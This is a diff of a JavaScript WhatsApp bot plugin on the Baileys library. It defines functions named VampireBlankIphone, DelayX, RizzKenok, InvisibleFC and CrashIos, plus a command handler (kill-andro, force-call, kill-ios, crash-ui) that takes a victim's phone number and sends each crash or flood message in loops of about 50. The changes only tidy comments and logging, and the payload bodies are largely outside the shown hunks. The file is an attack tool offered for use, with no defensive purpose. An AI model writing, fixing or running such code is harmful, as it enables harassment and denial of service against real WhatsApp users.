@@ -1,11 +1,12 @@
 const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
 
-// ---------------------- Helper: Sleep ---------------------- //
+// ---------------------- Helper ---------------------- //
 function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-// ---------------------- Attack Functions (with error protection) ---------------------- //
+// ====================== ORIGINAL CRASH FUNCTIONS (FIXED) ====================== //
+
 async function VampireBlankIphone(target, conn) {
     try {
         const message = {
@@ -159,8 +160,6 @@ async function DelayX(target, conn) {
                 }
             ]
         });
-
-        console.log(`✅ DelayX delivered to ${target}`);
     } catch (error) {
         console.error("DelayX error:", error);
     }
@@ -285,8 +284,6 @@ async function RizzKenok(target, conn) {
                 }
             }
         }, { participant: { jid: target } });
-
-        console.log(`✅ RizzKenok sent to ${target}`);
     } catch (err) {
         console.error("RizzKenok error:", err);
     }
@@ -396,24 +393,28 @@ async function InvisibleFC(target, conn) {
     }
 }
 
-// ---------------------- Main Command Handler ---------------------- //
+// ====================== COMMAND HANDLER ====================== //
 let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPremium }) => {
     try {
-        // 1. Extract target number
-        let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, '') : '';
+        // Extract target (fixed)
+        let pelaku = m.mentionedJid[0] 
+            ? m.mentionedJid[0] 
+            : (m.quoted ? m.quoted.sender : (text ? text.replace(/[^0-9]/g, '') : ''));
+        
         if (!pelaku) {
-            return m.reply(`❌ *Invalid format!*\nExample: ${usedPrefix + command} 62xxx`);
+            return m.reply(`❌ *No target!*\nExample: ${usedPrefix + command} 628123456789`);
         }
+        
         let isTarget = pelaku.includes('@') ? pelaku : pelaku + "@s.whatsapp.net";
-
-        // 2. Permission check
+        
+        // Permission check
         if (!isOwner && !isPremium) {
             return m.reply('🔒 This command is for premium users or owners only!');
         }
-
+        
         await conn.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
-
-        // 3. Execute attacks based on command
+        
+        // Attack loops (original counts)
         switch (command) {
             case "kill-andro":
             case "fclose":
@@ -426,7 +427,7 @@ let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPremium })
                     await RizzKenok(isTarget, conn);
                 }
                 break;
-
+                
             case "force-call":
             case "fc-call":
                 for (let r = 0; r < 50; r++) {
@@ -437,7 +438,7 @@ let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPremium })
                     await FChyUi(isTarget, conn);
                 }
                 break;
-
+                
             case "kill-invis":
             case "delayhard":
             case "delayinvis":
@@ -453,7 +454,7 @@ let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPremium })
                     await BlazeInvis(isTarget, conn);
                 }
                 break;
-
+                
             case "kill-ios":
             case "force-ios":
                 for (let r = 0; r < 50; r++) {
@@ -464,7 +465,7 @@ let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPremium })
                     await CrashIos(isTarget, conn);
                 }
                 break;
-
+                
             case "kill-ui":
             case "crash-ui":
             case "blank-ui":
@@ -476,20 +477,21 @@ let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPremium })
                     await CrashIos(isTarget, conn);
                 }
                 break;
-
+                
             default:
                 return m.reply('❓ Command not recognized.');
         }
-
+        
         await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
         return m.reply(`✅ *Attack finished*\n📛 Target: ${pelaku}\n⚡ Status: Success`);
+        
     } catch (error) {
         console.error("Handler error:", error);
-        return m.reply('❌ An error occurred while executing the command. Check console.');
+        return m.reply(`❌ Error: ${error.message}`);
     }
 };
 
-// ---------------------- Plugin Metadata ---------------------- //
+// ====================== METADATA ====================== //
 handler.help = [
     'kill-andro', 'fclose', 'forclose',
     'force-call', 'fc-call',
